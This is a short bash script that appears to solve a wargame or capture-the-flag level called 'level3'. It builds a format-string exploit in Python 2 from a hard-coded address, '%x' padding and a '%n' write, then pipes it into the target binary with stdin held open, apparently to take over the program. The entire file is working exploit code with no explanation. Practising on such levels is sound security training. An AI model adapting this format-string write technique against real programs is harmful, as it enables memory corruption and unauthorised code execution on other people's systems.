#!/usr/bin/env bash

python -c 'print "\x8c\x98\x04\x08" + "%10x" * 3 + "A" * 30 + "%n" ' > exploit
cat exploit - | ./level3
